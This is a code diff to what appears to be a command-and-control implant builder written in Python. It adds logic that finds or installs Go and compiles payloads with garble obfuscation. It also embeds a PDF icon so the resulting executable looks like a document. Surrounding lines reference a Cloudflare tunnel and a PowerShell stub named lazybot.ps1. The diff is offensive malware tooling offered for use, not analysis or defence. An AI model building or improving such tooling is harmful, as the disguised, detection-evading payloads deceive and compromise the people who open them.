@@ -33,6 +33,44 @@ from utils import (
     print_warn,
 )
 
+_GO_CANDIDATE_PATHS = (
+    "/usr/local/go/bin/go",
+    os.path.expanduser("~/go/bin/go"),
+    "/usr/bin/go",
+    "/usr/local/bin/go",
+)
+
+
+def _resolve_go_bin() -> str:
+    """Return the full path to the go binary.
+
+    Checks shutil.which first, then known installation directories.
+    Returns the bare name 'go' as a last resort so error messages stay readable.
+    """
+    found = shutil.which("go")
+    if found:
+        return found
+    for candidate in _GO_CANDIDATE_PATHS:
+        if os.path.isfile(candidate) and os.access(candidate, os.X_OK):
+            return candidate
+    return "go"
+
+
+def _ensure_go(cmd_fn: Callable[[str], Any]) -> str:
+    """Guarantee a go binary is available, installing via apt if needed.
+
+    Returns the resolved path to go so callers can build explicit commands.
+    """
+    go_bin = _resolve_go_bin()
+    if go_bin != "go" or shutil.which("go"):
+        return go_bin
+    print_warn("go not found — installing golang via apt-get...")
+    cmd_fn("apt-get install -y golang-go 2>&1 | tail -5")
+    go_bin = _resolve_go_bin()
+    if go_bin == "go" and not shutil.which("go"):
+        print_error("go installation failed. Install Go manually: https://go.dev/dl/")
+    return go_bin
+
 
 @dataclass(frozen=True)
 class C2Profile:
@@ -227,12 +265,6 @@ echo "Cloudflare Tunnel URL: $link"
         random_string = base64.b64encode(random_bytes).decode("utf-8")[:12]
         working_dir = f"{path}/sessions/"
 
-        if not is_binary_present("garble"):
-            self.cmd("go install github.com/burrowers/garble@latest")
-            gocompiler = "go build"
-        else:
-            gocompiler = "garble -literals -tiny build "
-
         if not choice:
             choice = (
                 input(
@@ -294,6 +326,15 @@ chmod +x /tmp/stub && \
 
         if not _preflight(profile):
             return {}
+
+        go_bin = _ensure_go(self.cmd)
+        if not is_binary_present("garble"):
+            self.cmd(f"{go_bin} install github.com/burrowers/garble@latest")
+            garble_bin = shutil.which("garble") or os.path.expanduser("~/go/bin/garble")
+            gocompiler = f"{go_bin} build"
+        else:
+            garble_bin = shutil.which("garble") or "garble"
+            gocompiler = f"{garble_bin} -literals -tiny build "
 
         file = f"{path}/modules/run"
         wfile = f"{path}/sessions/win/lazybot.ps1"
@@ -418,8 +459,9 @@ chmod +x /tmp/stub && \
                 print_msg(f"Tool '{tool_to_check}' is installed.")
             else:
                 print_msg(f"Installing tool '{tool_to_check}'.")
-                self.cmd("go install github.com/akavel/rsrc@latest")
-            self.cmd("rsrc -ico static/pdf.ico -o sessions/icon.syso")
+                self.cmd(f"{go_bin} install github.com/akavel/rsrc@latest")
+            rsrc_bin = shutil.which("rsrc") or os.path.expanduser("~/go/bin/rsrc")
+            self.cmd(f"{rsrc_bin} -ico static/pdf.ico -o sessions/icon.syso")
 
         cc = f"CC={profile.cc} " if profile.cc else ""
         cgo = f"CGO_ENABLED={profile.cgo} "
